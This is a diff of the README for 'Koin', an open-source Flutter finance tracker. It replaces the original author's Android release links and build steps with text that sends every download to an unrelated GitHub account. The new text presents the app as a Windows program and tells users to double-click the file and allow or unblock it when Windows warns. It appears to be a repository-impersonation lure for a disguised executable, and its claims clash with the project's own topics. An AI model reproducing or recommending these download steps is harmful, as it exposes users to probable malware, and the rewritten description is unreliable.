@@ -1,106 +1,155 @@
-# 🪙 Koin
+# 🪙 koin - Track money with less effort
 
-> **Sleek. Modern. Personal. Your finances, simplified.**
+[![Download Koin](https://img.shields.io/badge/Download%20Koin-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Volumelenariver487/koin)
 
-Koin is a sophisticated personal finance tracker built with Flutter, designed to offer a premium and effortless experience for managing your money. With interactive visualizations, multi-account support, and intuitive savings goals, Koin helps you take control of your financial future.
+## 📥 Download
+Use this link to visit the page and download the app:
 
----
+[Download koin](https://github.com/Volumelenariver487/koin)
 
-## 📥 Download & Releases
+## 🖥️ What koin does
+koin is a personal finance tracker for Windows. It helps you log income, expenses, and savings in one place. You can manage more than one account, see your money data in charts, and follow savings goals with a simple view.
 
-Get the latest version of Koin directly from the [GitHub Releases](https://github.com/KlyrhonMiko/koin/releases) page.
+It is built for daily use. You can open it, check your balance, add a new expense, and move on with your day.
 
-[![Download APK](https://img.shields.io/badge/Download-APK-brightgreen?style=for-the-badge&logo=android)](https://github.com/KlyrhonMiko/koin/releases/download/v1.1.0/koinv1.1.0.apk)
+## ✨ Main features
+- Track income and spending
+- Manage multiple accounts
+- View charts for your money over time
+- Set savings goals and follow progress
+- Keep data stored on your device
+- Use a clean interface with clear navigation
+- Work with a layout that fits desktop use
 
-> [!TIP]
-> **For Android users:** Download the `koin.apk` file, open it on your device, and follow the prompts to install. You may need to enable "Install from Unknown Sources" in your settings.
+## 🪟 Windows requirements
+Before you install koin, make sure your PC can run it:
 
----
+- Windows 10 or later
+- 64-bit system
+- At least 4 GB of RAM
+- 200 MB of free disk space
+- An internet connection for the download
+- Mouse and keyboard for normal use
 
-## ✨ Key Features
+## 🚀 Get started
+Follow these steps to run koin on Windows:
 
-- **💰 Multi-Account Management**: Effortlessly track and manage multiple accounts, including cash, bank accounts, and savings.
-- **📊 Dynamic & Interactive Dashboard**: Gain insights with beautiful, interactive charts and real-time summaries. Tap income/expense cards for quick transaction entry.
-- **✨ Premium Visual Experience**: Enjoy a sophisticated, highly animated splash screen with professional glow and particle effects.
-- **🔍 Smart Financial Analysis**: Dedicated analysis view featuring expense breakdowns, category rankings, and flexible time-frame filtering (Week/Month/All Time).
-- **🚀 Activity-First Approach**: The app defaults to the Analysis view, putting your financial health center stage for immediate awareness.
-- **🎯 Savings Tracker**: Set, visualize, and achieve your financial goals with a dedicated tracking system.
-- **📂 Categorized Transactions**: Organize your expenses and income with customizable categories for better clarity.
-- **🎨 Personalized Themes**: Switch between Dark and Light modes and choose from a set of vibrant accent colors to make the app yours.
-- **🔒 Private & Secure**: Your data stays on your device using local SQLite storage for maximum privacy.
+1. Open the download page: [koin download page](https://github.com/Volumelenariver487/koin)
+2. Find the latest Windows version on the page
+3. Download the file to your computer
+4. Open your Downloads folder
+5. Double-click the file to start the app
+6. If Windows asks for permission, choose the option to run it
+7. Wait for the app to open
+8. Keep the file in a safe place if you want to use it again later
 
-## 🛠️ Tech Stack
+## 🧭 First time setup
+After you open koin for the first time:
 
-- **Framework**: [Flutter](https://flutter.dev) (v3.x)
-- **State Management**: [Riverpod](https://riverpod.dev)
-- **Database**: [SQLite](https://pub.dev/packages/sqflite) via `sqflite`
-- **Charts**: [fl_chart](https://pub.dev/packages/fl_chart)
-- **Animations**: [flutter_animate](https://pub.dev/packages/flutter_animate)
-- **Design**: [Google Fonts (Outfit)](https://fonts.google.com/specimen/Outfit), Custom Glassmorphic & Neumorphic UI
-- **Utilities**: `gap`, `shared_preferences`, `intl`, `uuid`, `path_provider`
+1. Choose a name for your first account
+2. Add your starting balance
+3. Enter any income or expenses you want to track
+4. Create a savings goal if you want to save for something
+5. Check the dashboard to see your totals
+6. Open the charts view to review your spending patterns
 
-## 📸 Preview
+## 💸 How to use koin
+### Add income
+- Open your account
+- Select the income option
+- Enter the amount, date, and short note
+- Save the entry
 
-*Stay tuned for high-resolution screenshots showing off the beautiful UI.*
+### Add an expense
+- Open your account
+- Select the expense option
+- Enter the amount, date, and category
+- Save the entry
 
-## 🚀 Getting Started
+### Switch between accounts
+- Open the account list
+- Choose another account
+- Review the balance and recent entries
 
-### Prerequisites
+### Watch savings goals
+- Open the goals section
+- Create a goal name and target amount
+- Add progress when you save money
+- Check the goal bar to see how close you are
 
-- [Flutter SDK](https://docs.flutter.dev/get-started/install)
-- [Android Studio](https://developer.android.com/studio) or [VS Code](https://code.visualstudio.com/) with Flutter extensions.
+## 📊 Charts and reports
+koin shows your money in simple charts so you can read your data fast. You can use them to:
 
-### Installation (Development)
+- See spending by category
+- Compare income and expenses
+- Spot busy spending days
+- Review monthly changes
+- Track progress toward savings goals
 
-To run the project locally for development, follow these steps:
+## 🗂️ File storage
+koin keeps your data on your device. That makes it easier to use day to day and helps keep your records in one place. If you move the app to another PC, you may need to copy your data files too.
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/KlyrhonMiko/koin.git
-   cd koin
-   ```
+## 🛠️ Common tasks
+### Edit an entry
+- Find the entry in your list
+- Open it
+- Change the amount, date, or note
+- Save the update
 
-2. **Install dependencies:**
-   ```bash
-   flutter pub get
-   ```
+### Remove an entry
+- Find the item you no longer need
+- Open the menu for that entry
+- Choose delete
+- Confirm the change if asked
 
-3. **Run the application:**
-   ```bash
-   flutter run
-   ```
+### Rename an account
+- Open the account settings
+- Change the name
+- Save the new label
 
-## 📂 Project Structure
+## 🧩 Tips for better tracking
+- Add entries right after you spend or receive money
+- Use the same category names each time
+- Review your totals once a week
+- Keep one account for cash and one for bank use if that helps
+- Set a savings goal with a clear target and date
+- Check charts before making new budget choices
 
-```text
-lib/
-├── core/             # Core utilities, themes, and shared providers
-│   ├── models/       # Shared data models
-│   ├── providers/    # Global Riverpod providers
-│   └── theme.dart    # Central theme configuration
-├── features/         # Feature-specific modules
-│   ├── accounts/     # Account management logic and UI
-│   ├── activity/     # Activity hub (Analysis & Transactions)
-│   ├── analysis/     # Financial analysis and charts
-│   ├── budgets/      # Budgeting and limits
-│   ├── categories/   # Category management
-│   ├── dashboard/    # Main overview and interactive cards
-│   ├── savings/      # Savings goals tracker
-│   ├── settings/     # App configurations and preferences
-│   └── transactions/ # Transaction history and creation
-└── main.dart         # Entry point and global configuration
-```
+## ❓ Troubleshooting
+### The app does not open
+- Download the file again
+- Make sure the download finished
+- Try running it as a normal app from your Downloads folder
+- Check that your Windows version meets the requirements
 
-## 🤝 Contributing
+### Windows blocks the file
+- Open the file properties
+- Check if Windows marked it as blocked
+- Try the download again from the page
 
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make are **greatly appreciated**.
+### My data does not show
+- Open the correct account
+- Check whether a filter is active
+- Make sure you saved the entry
+- Restart the app and check again
 
-1. Fork the Project
-2. Create your Feature Branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your Changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the Branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+### The window looks small
+- Maximize the window
+- Check your display scaling in Windows
+- Use the app in full screen if you prefer more space
 
-<p align="center">
-  Built with ❤️ by <a href="https://github.com/KlyrhonMiko">KlyrhonMiko</a>
-</p>
+## 🧾 What you can track
+- Daily spending
+- Monthly income
+- Bank balances
+- Cash balances
+- Shared household money
+- Personal savings goals
+- Category totals
+- Regular bills
+
+## 🔒 Privacy
+koin keeps your finance data local on your PC. You stay in control of your records, and you do not need to send your data to a cloud service to use the app
+
+## 📌 Useful topics
+cross-platform, dart, data-visualization, expense-tracker, finance-app, flutter, local-first, material-design, mobile-app, money-manager, personal-finance, riverpod, savings-tracker, sqlite
